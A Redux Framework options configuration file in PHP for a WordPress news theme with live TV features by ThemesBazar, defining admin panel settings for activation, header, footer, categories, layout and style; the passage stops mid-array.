<?php
    /**
     * ReduxFramework Sample Config File
     * For full documentation, please visit: http://docs.reduxframework.com/
     */

    if ( ! class_exists( 'Redux' ) ) {
        return;
    }


    // This is your option name where all the Redux data is stored.
    $opt_name = "themesbazar";

    // This line is only for altering the demo. Can be easily removed.
    $opt_name = apply_filters( 'themesbazar/opt_name', $opt_name );

    /*
     *
     * --> Used within different fields. Simply examples. Search for ACTUAL DECLARATION for field examples
     *
     */

    $sampleHTML = '';
    if ( file_exists( dirname( __FILE__ ) . '/info-html.html' ) ) {
        Redux_Functions::initWpFilesystem();

        global $wp_filesystem;

        $sampleHTML = $wp_filesystem->get_contents( dirname( __FILE__ ) . '/info-html.html' );
    }

    // Background Patterns Reader
    $sample_patterns_path = ReduxFramework::$_dir . '../sample/patterns/';
    $sample_patterns_url  = ReduxFramework::$_url . '../sample/patterns/';
    $sample_patterns      = array();
    
    if ( is_dir( $sample_patterns_path ) ) {

        if ( $sample_patterns_dir = opendir( $sample_patterns_path ) ) {
            $sample_patterns = array();

            while ( ( $sample_patterns_file = readdir( $sample_patterns_dir ) ) !== false ) {

                if ( stristr( $sample_patterns_file, '.png' ) !== false || stristr( $sample_patterns_file, '.jpg' ) !== false ) {
                    $name              = explode( '.', $sample_patterns_file );
                    $name              = str_replace( '.' . end( $name ), '', $sample_patterns_file );
                    $sample_patterns[] = array(
                        'alt' => $name,
                        'img' => $sample_patterns_url . $sample_patterns_file
                    );
                }
            }
        }
    }

    /**
     * ---> SET ARGUMENTS
     * All the possible arguments for Redux.
     * For full documentation on arguments, please refer to: https://github.com/ReduxFramework/ReduxFramework/wiki/Arguments
     * */

    $theme = wp_get_theme(); // For use with some settings. Not necessary.

    $args = array(
        // TYPICAL -> Change these values as you need/desire
        'opt_name'             => $opt_name,
        // This is where your data is stored in the database and also becomes your global variable name.
        'display_name'         => $theme->get( 'Name' ),
        // Name that appears at the top of your panel
        'display_version'      => $theme->get( 'Version' ),
        // Version that appears at the top of your panel
        'menu_type'            => 'menu',
        //Specify if the admin menu should appear or not. Options: menu or submenu (Under appearance only)
        'allow_sub_menu'       => true,
        // Show the sections below the admin menu item or not
        'menu_title'           => __( 'Theme Options', 'redux-framework-demo' ),
        'page_title'           => __( 'Themesbazar.com Themes Options', 'redux-framework-demo' ),
        // You will need to generate a Google API key to use this feature.
        // Please visit: https://developers.google.com/fonts/docs/developer_api#Auth
        'google_api_key'       => '',
        // Set it you want google fonts to update weekly. A google_api_key value is required.
        'google_update_weekly' => false,
        // Must be defined to add google fonts to the typography module
        'async_typography'     => true,
        // Use a asynchronous font on the front end or font string
        //'disable_google_fonts_link' => true,                    // Disable this in case you want to create your own google fonts loader
        'admin_bar'            => true,
        // Show the panel pages on the admin bar
        'admin_bar_icon'       => 'dashicons-portfolio',
        // Choose an icon for the admin bar menu
        'admin_bar_priority'   => 50,
        // Choose an priority for the admin bar menu
        'global_variable'      => '',
        // Set a different name for your global variable other than the opt_name
        'dev_mode'             => false,
        // Show the time the page took to load, etc
        'update_notice'        => false,
        // If dev_mode is enabled, will notify developer of updated versions available in the GitHub Repo
        'customizer'           => false,
        // Enable basic customizer support
        //'open_expanded'     => true,                    // Allow you to start the panel in an expanded way initially.
        //'disable_save_warn' => true,                    // Disable the save warning when a user changes a field

        // OPTIONAL -> Give you extra features
        'page_priority'        => 10,
        // Order where the menu appears in the admin area. If there is any conflict, something will not show. Warning.
        'page_parent'          => 'themes.php',
        // For a full list of options, visit: http://codex.wordpress.org/Function_Reference/add_submenu_page#Parameters
        'page_permissions'     => 'manage_options',
        // Permissions needed to access the options panel.
        'menu_icon'            => '',
        // Specify a custom URL to an icon
        'last_tab'             => '',
        // Force your panel to always open to a specific tab (by id)
        'page_icon'            => 'icon-themes',
        // Icon displayed in the admin panel next to your menu_title
        'page_slug'            => '',
        // Page slug used to denote the panel, will be based off page title then menu title then opt_name if not provided
        'save_defaults'        => true,
        // On load save the defaults to DB before user clicks save or not
        'default_show'         => false,
        // If true, shows the default value next to each field that is not the default value.
        'default_mark'         => '',
        // What to print by the field's title if the value shown is default. Suggested: *
        'show_import_export'   => true,
        // Shows the Import/Export panel when not used as a field.

        // CAREFUL -> These options are for advanced use only
        'transient_time'       => 60 * MINUTE_IN_SECONDS,
        'output'               => true,
        // Global shut-off for dynamic CSS output by the framework. Will also disable google fonts output
        'output_tag'           => true,
        // Allows dynamic CSS to be generated for customizer and google fonts, but stops the dynamic CSS from going to the head
        // 'footer_credit'     => '',                   // Disable the footer credit of Redux. Please leave if you can help it.

        // FUTURE -> Not in use yet, but reserved or partially implemented. Use at your own risk.
        'database'             => '',
        // possible: options, theme_mods, theme_mods_expanded, transient. Not fully functional, warning!
        'use_cdn'              => true,
        // If you prefer not to use the CDN for Select2, Ace Editor, and others, you may download the Redux Vendor Support plugin yourself and run locally or embed it in your code.

        // HINTS
        'hints'                => array(
            'icon'          => 'el el-question-sign',
            'icon_position' => 'right',
            'icon_color'    => 'lightgray',
            'icon_size'     => 'normal',
            'tip_style'     => array(
                'color'   => 'red',
                'shadow'  => true,
                'rounded' => false,
                'style'   => '',
            ),
            'tip_position'  => array(
                'my' => 'top left',
                'at' => 'bottom right',
            ),
            'tip_effect'    => array(
                'show' => array(
                    'effect'   => 'slide',
                    'duration' => '500',
                    'event'    => 'mouseover',
                ),
                'hide' => array(
                    'effect'   => 'slide',
                    'duration' => '500',
                    'event'    => 'click mouseleave',
                ),
            ),
        )
    );

    // ADMIN BAR LINKS -> Setup custom links in the admin bar menu as external items.
    $args['admin_bar_links'][] = array(
        'id'    => 'redux-docs',
        'href'  => 'http://docs.reduxframework.com/',
        'title' => __( 'Documentation', 'redux-framework-demo' ),
    );

    $args['admin_bar_links'][] = array(
        //'id'    => 'redux-support',
        'href'  => 'https://github.com/ReduxFramework/redux-framework/issues',
        'title' => __( 'Support', 'redux-framework-demo' ),
    );

    $args['admin_bar_links'][] = array(
        'id'    => 'redux-extensions',
        'href'  => 'reduxframework.com/extensions',
        'title' => __( 'Extensions', 'redux-framework-demo' ),
    );

    // SOCIAL ICONS -> Setup custom links in the footer for quick links in your panel footer icons.
    $args['share_icons'][] = array(
        'url'   => 'https://github.com/popular-it',
        'title' => 'Visit us on GitHub',
        'icon'  => 'el el-github'
        //'img'   => '', // You can use icon OR img. IMG needs to be a full URL.
    );
    $args['share_icons'][] = array(
        'url'   => 'https://www.facebook.com/themesbazar/',
        'title' => 'Like us on Facebook',
        'icon'  => 'el el-facebook'
    );
    $args['share_icons'][] = array(
        'url'   => 'https://twitter.com/helalprogrammer',
        'title' => 'Follow us on Twitter',
        'icon'  => 'el el-twitter'
    );
    $args['share_icons'][] = array(
        'url'   => 'https://www.linkedin.com/company/themesbazar.com',
        'title' => 'Find us on LinkedIn',
        'icon'  => 'el el-linkedin'
    );

    // Panel Intro text -> before the form
    if ( ! isset( $args['global_variable'] ) || $args['global_variable'] !== false ) {
        if ( ! empty( $args['global_variable'] ) ) {
            $v = $args['global_variable'];
        } else {
            $v = str_replace( '-', '_', $args['opt_name'] );
        }
        $args['intro_text'] = sprintf( __( '', 'redux-framework-demo' ), $v );
    } else {
        $args['intro_text'] = __( '<p>This text is displayed above the options panel. It isn\'t required, but more info is always better! The intro_text field accepts all HTML.</p>', 'redux-framework-demo' );
    }

    // Add content after the form.
    $args['footer_text'] = __( '', 'redux-framework-demo' );

    Redux::setArgs( $opt_name, $args );

    /*
     * ---> END ARGUMENTS
     */


    /*
     * ---> START HELP TABS
     */

    $tabs = array(
        array(
            'id'      => 'redux-help-tab-1',
            'title'   => __( 'Theme Information 1', 'redux-framework-demo' ),
            'content' => __( '<p>This is the tab content, HTML is allowed.</p>', 'redux-framework-demo' )
        ),
        array(
            'id'      => 'redux-help-tab-2',
            'title'   => __( 'Theme Information 2', 'redux-framework-demo' ),
            'content' => __( '<p>This is the tab content, HTML is allowed.</p>', 'redux-framework-demo' )
        )
    );
    Redux::setHelpTab( $opt_name, $tabs );

    // Set the help sidebar
    $content = __( '<p>This is the sidebar content, HTML is allowed.</p>', 'redux-framework-demo' );
    Redux::setHelpSidebar( $opt_name, $content );


    /*
     * <--- END HELP TABS
     */


    /*
     *
     * ---> START SECTIONS
     *
     */

    /*

        As of Redux 3.5+, there is an extensive API. This API can be used in a mix/match mode allowing for


     ////////////////////////// */

    
   
      Redux::setSection( $opt_name, array(
        'title'            => __( 'Activation Theme', 'ThemesBazar' ),
        'id'               => 'purchase_theme',
        'icon'             => 'el el-home',
       'fields'           => array(
           
            array(
                'id'       => 'config_theme',
                'type'     => 'text',
                'title'    => __( 'Theme Purchase code', 'ThemesBazar' ),
                'subtitle' => __( 'Please Active Your Theme', 'ThemesBazar' ),
                'desc' => __( 'For activation code Please Contect Themesbazar Helpline', 'ThemesBazar' ),
                'default'  => 'ThemesBazar-Jowfhowo',
            ),

        ),
    
    ) );
	
	
	
	

 // -> ----------------------START Live TV Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Live TV Options', 'redux-framework-demo' ),
        'id'               => 'livetv',
        'icon'             => 'el el-video',
       'fields'           => array(
            array(
			    'title' => __('Homepage TV Screen Show Hide', 'redux-framework-demo'),
				'id' => 'home_screen',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show TV Screen in Homepage', 
                  '2' => 'Hide TV Screen in Homepage', 
                 
                      ),
				  'default' => '1'
					  
			  ),
			  array(
			    'title' => __('Live Option', 'redux-framework-demo'),
				'id' => 'live',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Live From Youtube', 
                  '2' => 'Live From Youtube Playlist',
                  '3' => 'Live From Facebook', 
                  '4' => 'Live From Your Server',
                 
                      ),
				  'default' => '1'
					  
			  ),
			  
			  array(
			    'title' => __('Youtubte Playlist', 'redux-framework-demo'),
				'id' => 'playlist',
				'type' => 'text',
				'options' => array(
					'first_code' => 'First Code',
					'secend_code' => 'Secend Code',
					)
				
			  ),
			  
			  array(
                'id'        => 'facebook_live',
                'type'      => 'text',
                'title'     => __( 'Facebook Live Link', 'redux-framework-demo' ),
                'default'   => 'https://www.facebook.com/themesbazar/videos/243216379501534/',

            ),
            array(
                'id'        => 'own-pc',
                'type'      => 'text',
                'title'     => __( 'Pest Here Video Link From Media', 'redux-framework-demo' ),
                'subtitle'  => __( 'Upload MP4 File Add Media, Next Copy Video Link and Pest Here', 'redux-framework-demo' ),
                'default'   => '',

            ),
            
            

            
			array(
			    'title' => __('Logo Show Option', 'redux-framework-demo'),
				'id' => 'logo-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show Logo', 
                  '2' => 'Hide Logo', 
                 
                      ),
				  'default' => '1'
					  
			  ),
			array(
                'id'       => 'logo_monitor',
                'type'     => 'media',
                'title'    => __( 'Monitor Logo Uploader', 'redux-framework-demo' ),
                'subtitle' => __( 'Logo Size 500px*450px', 'redux-framework-demo' ),
                'default'  => '',
                'compiler'  => true,
                'default'  => array(
                    'url' => get_template_directory_uri().'/images/homepage-logo.gif',
                )
            ),
			  
           
        )


    
    ) );
           


// -> ----------------------START Header Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Header Options', 'redux-framework-demo' ),
        'id'               => 'header',
        'icon'             => 'el el-home',
       'fields'           => array(
	   			  array(
			    'title' => __('Site Content option', 'ThemesBazar'),
				'id' => 'site-content',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Bangla', 
                  '2' => 'English', 
                 
                      ),
				  'default' => '2'
					  
			  ),
            array(
                'id'       => 'logo_upload',
                'type'     => 'media',
                'title'    => __( 'Logo Uploader', 'redux-framework-demo' ),
                'subtitle' => __( 'Logo Size : 620px * 200px', 'redux-framework-demo' ),
                'default'  => '',
                'compiler'  => true,
                'default'  => array(
                    'url' => get_template_directory_uri().'/images/logo.gif',
                )
            ),
            array(
                'id'        => 'bannar_upload',
                'type'      => 'media',
                'title'     => __( 'Bannar Uploader', 'redux-framework-demo' ),
                'subtitle'  => __( 'Bannar Size 800px * 140px', 'redux-framework-demo' ),
                'default'   => '',
                'compiler'   => true,
                'default'  => array(
                    'url' => get_template_directory_uri().'/images/bannar.gif',
                )

            ),
            array(
			    'title' => __('Bannar Link', 'redux-framework-demo'),
				'id' => 'bannar-link',
				'type' => 'text',
				'options' => array(
					'bannar-url' => 'Bannar Url',
					),
					'default' => array(
						'bannar-url' => 'https://www.themesbazar.com',
			       )
				
			  ),

            
           
        )


    
    ) );


 // -> ----------------------START Footer Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Footer Options', 'redux-framework-demo' ),
        'id'               => 'footer',
        'icon'             => 'el el-th',
       'fields'           => array(
	   
	              array(
			    'title' => __('Social Profiles', 'redux-framework-demo'),
				'id' => 'social-link',
				'type' => 'text',
				'options' => array(
					'facebook-url' => 'Facebook Link',
					'twitter-url' => 'Twitter Link',
					'googleplus-url' => 'Googleplus Link',
					'youtube-url' => 'Youtube Link',
					'android-url' => 'Andorid Link',
					'rss-url' => 'RSS Link',
					'windows-url' => 'Windows Link',
					'mac-url' => 'Mac Link',
					'website-url' => 'Website Link',
					'linkedin-url' => 'Linkedin Link',
					'instagram-url' => 'Instagram Link',
					'pinterest-url' => 'Pinterest Link',
					),
					'default' => array(
						'facebook-url' => 'https://www.facebook.com/themesbazar/',
						'twitter-url' => 'https://twitter.com/helalprogrammer',
						'googleplus-url' => 'https://plus.google.com/u/0/102123215346349058833',
						'youtube-url' => 'https://www.youtube.com/themesbazar',
						'android-url' => 'https://www.themesbazar.com',
						'rss-url' => 'https://www.themesbazar.com',
						'windows-url' => 'https://www.themesbazar.com',
						'mac-url' => 'https://www.themesbazar.com',
						'website-url' => 'https://www.themesbazar.com',
						'linkedin-url' => 'https://www.themesbazar.com',
						'instagram-url' => 'https://www.themesbazar.com',
						'pinterest-url' => 'https://www.themesbazar.com',

			       )
				
			  ),
			  
           array(
                'id'       => 'editorial',
                'type'     => 'editor',
                'title'    => __( 'Editorial Text', 'redux-framework-demo' ),
                'default'  => 'ThemesBazar.Com, Office : Room No : 394, Muktobangla Shopping Complex (3rd floor), Mirpur-1, Dhaka-1216, Mobile : 01732-667364, Email : Sales@themesbazar.com',
            ),
			
			array(
                'id'       => 'editorial-two',
                'type'     => 'editor',
                'title'    => __( '2nd Editorial Text', 'redux-framework-demo' ),
                'default'  => 'ThemesBazar.Com, Office : Room No : 394, Muktobangla Shopping Complex (3rd floor), Mirpur-1, Dhaka-1216, Mobile : 01732-667364, Email : Sales@themesbazar.com',
            ),
      
           array(
                'id'       => 'copyright',
                'type'     => 'editor',
                'title'    => __( 'Copyright Text', 'redux-framework-demo' ),
                'default'  => '&copy; All rights reserved &copy; 2017 ThemesBazar.Com',
            ),

        )


    
    ) );

// -> ----------------------START Category Option----------------------------------------------#

Redux::setSection( $opt_name, array(
        'title'            => __( 'Category Settings', 'redux-framework-demo' ),
        'id'               => 'category',
        'icon'             => 'el el-cog',
       'fields'           => array(
            array(
			    'title' => __('One Category option', 'redux-framework-demo'),
				'id' => 'one-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-one',
                'type'     => 'select',
                'title'    => __( '1st Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
			    'title' => __('Two Category option', 'redux-framework-demo'),
				'id' => 'two-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-two',
                'type'     => 'select',
                'title'    => __( '2nd Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
			    'title' => __('Three Category option', 'redux-framework-demo'),
				'id' => 'three-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-three',
                'type'     => 'select',
                'title'    => __( '3rd Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
           array(
                'id'       => 'how-cat-three',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 6,
            ),
			array(
			    'title' => __('Four Category option', 'redux-framework-demo'),
				'id' => 'four-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-four',
                'type'     => 'select',
                'title'    => __( '4th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
			    'title' => __('Five Category option', 'redux-framework-demo'),
				'id' => 'five-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-five',
                'type'     => 'select',
                'title'    => __( '5th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
			    'title' => __('Six & Seven Category option', 'redux-framework-demo'),
				'id' => 'six-seven-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
			  array(
                'id'       => 'cat-six',
                'type'     => 'select',
                'title'    => __( '6th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-six',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 5,
            ),
			array(
                'id'       => 'cat-seven',
                'type'     => 'select',
                'title'    => __( '7th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-seven',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 5,
            ),
			array(
			    'title' => __('Eight Category option', 'redux-framework-demo'),
				'id' => 'eight-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-eight',
                'type'     => 'select',
                'title'    => __( '8th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
			    'title' => __('Nine Category option', 'redux-framework-demo'),
				'id' => 'nine-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-nine',
                'type'     => 'select',
                'title'    => __( '9th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
			    'title' => __('Ten Category option', 'redux-framework-demo'),
				'id' => 'ten-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-ten',
                'type'     => 'select',
                'title'    => __( '10th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-ten',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 3,
            ),
			array(
			    'title' => __('Eleven Category option', 'redux-framework-demo'),
				'id' => 'eleven-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-eleven',
                'type'     => 'select',
                'title'    => __( '11th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-eleven',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 3,
            ),
			array(
			    'title' => __('Twelve Category option', 'redux-framework-demo'),
				'id' => 'twelve-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-twelve',
                'type'     => 'select',
                'title'    => __( '12th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-twelve',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 3,
            ),
			array(
			    'title' => __('Thirteen Category option', 'redux-framework-demo'),
				'id' => 'thirteen-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-thirteen',
                'type'     => 'select',
                'title'    => __( '13th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-thirteen',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 3,
            ),
			array(
			    'title' => __('Fourteen Category option', 'redux-framework-demo'),
				'id' => 'fourteen-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-fourteen',
                'type'     => 'select',
                'title'    => __( '14th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-fourteen',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 3,
            ),
			array(
			    'title' => __('Fifteen Category option', 'redux-framework-demo'),
				'id' => 'fifteen-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-fifteen',
                'type'     => 'select',
                'title'    => __( '15th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-fifteen',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 3,
            ),
			array(
			    'title' => __('Sixteen Category option', 'redux-framework-demo'),
				'id' => 'sixteen-cat-show',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Show', 
                  '2' => 'Hide', 
                 
                      ),
				  'default' => '1'  
			  ),
           array(
                'id'       => 'cat-sixteen',
                'type'     => 'select',
                'title'    => __( '16th Category', 'redux-framework-demo' ),
                'subtitle'  => __( 'Please Select Your Category', 'redux-framework-demo' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'redux-framework-demo' ),
                'default'  => '1',
                'data'  => 'category',
            ),
			array(
                'id'       => 'how-cat-sixteen',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 3,
            ),
			
			
           
            
            

        )


    
    ) );




// -> ----------------------START Layout Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Layout', 'redux-framework-demo' ),
        'id'               => 'layout',
        'icon'             => 'el el-qrcode',
       'fields'           => array(
            array(
                'id'       => 'scrool',
                'type'     => 'text',
                'title'    => __( 'Scroll Title', 'redux-framework-demo' ),
                'default'  => 'Headline :',
            ),
           array(
                'id'       => 'howscrool',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 10,
            ),
            array(
                'id'       => 'scrool_two',
                'type'     => 'text',
                'title'    => __( 'Scroll Title', 'redux-framework-demo' ),
                'default'  => 'Notice :',
            ),
           array(
                'id'       => 'howscrool_two',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 2,
            ),
           array(
                'id'       => 'last',
                'type'     => 'text',
                'title'    => __( 'Last Update Title', 'redux-framework-demo' ),
                'default'  => 'Last Update',
            ),
           array(
                'id'       => 'lastpost',
                'type'     => 'text',
                'title'    => __( 'How Many Post', 'redux-framework-demo' ),
                'default'  => 10,
            ),
           array(
                'id'       => 'popular',
                'type'     => 'text',
                'title'    => __( 'PopularPost Title', 'redux-framework-demo' ),
                'default'  => 'Popular Post',
            ),
			array(
                'id'       => 'more_news',
                'type'     => 'text',
                'title'    => __( 'PopularPost Title', 'redux-framework-demo' ),
                'default'  => 'More News..',
            ),
           	array(
			    'title' => __('Facebook', 'redux-framework-demo'),
				'id' => 'facebook',
				'type' => 'button_set',
				   'options' => array(
                  '1' => 'Facebook Show', 
                  '2' => 'Facebook Hide', 
                 
                      ),
				  'default' => '1'
					  
			  ),
			  array(
                'id'       => 'facebook-title',
                'type'     => 'text',
                'title'    => __( 'Facebook Title', 'redux-framework-demo' ),
                'default'  => 'Our Like Page',
            ),
			  array(
			    'title' => __('Facebook Link', 'redux-framework-demo'),
				'id' => 'facebook-link',
				'type' => 'text',
				'options' => array(
					'face-url' => 'Facebook Url',
					),
					'default' => array(
						'face-url' => 'https://www.facebook.com/themesbazar',
			       )
				
			  ),
			  array(
                'id'       => 'facebook-width',
                'type'     => 'text',
                'title'    => __( 'Facebook width', 'redux-framework-demo' ),
                'default'  => '300',
            ),
            array(
                'id'       => 'facebook-height',
                'type'     => 'text',
                'title'    => __( 'Facebook Height', 'redux-framework-demo' ),
                'default'  => '350',
            ),
			


        )


    
    ) );


// -> ----------------------START Style Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Style', 'redux-framework-demo' ),
        'id'               => 'style',
        'icon'             => 'el el-adjust',
       'fields'           => array(
            array(
                    'id'       => 'body-color',
                    'type'     => 'color',
                    'title'    => __('Body Background Color', 'redux-framework-demo'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
                    'default'  => '#fff',
                    'validate' => 'color',
                ),
           array(
                    'id'       => 'body-font',
                    'type'     => 'typography',
                    'title'    => __('Body Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here Body Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
                    'line-height' => false,
                    'color' => false,
                    'default'     => array(
                         'font-size'   => '16px', 
                )
                    
                ),
				array(
					'id'       => 'monitor-background',
					'type'     => 'color',
					'title'    => __('Monitor Background', 'redux-framework-demo'),
					'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
					'default'  => '#000000',
					'validate' => 'color',
				),	
            array(
                    'id'       => 'menu-background',
                    'type'     => 'color',
                    'title'    => __('Menu Background', 'redux-framework-demo'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'redux-framework-demo'),
                    'default'  => '#48014B',
                    'validate' => 'color',
                ),
           array(
                    'id'       => 'menu-font',
                    'type'     => 'typography',
                    'title'    => __('Menu Color and Font Size', 'redux-framework-demo'),
                    'subtitle' => __('Please Set Here Menu Color and Font Size.', 'redux-framework-demo'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => true,
                    'line-height' => false,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '20px', 
                         'line-height'   => '25px', 
                         'text-align'   => 'left', 
                         'color'   => '#FFFFFF', 
                )
                    
                ),
				array(
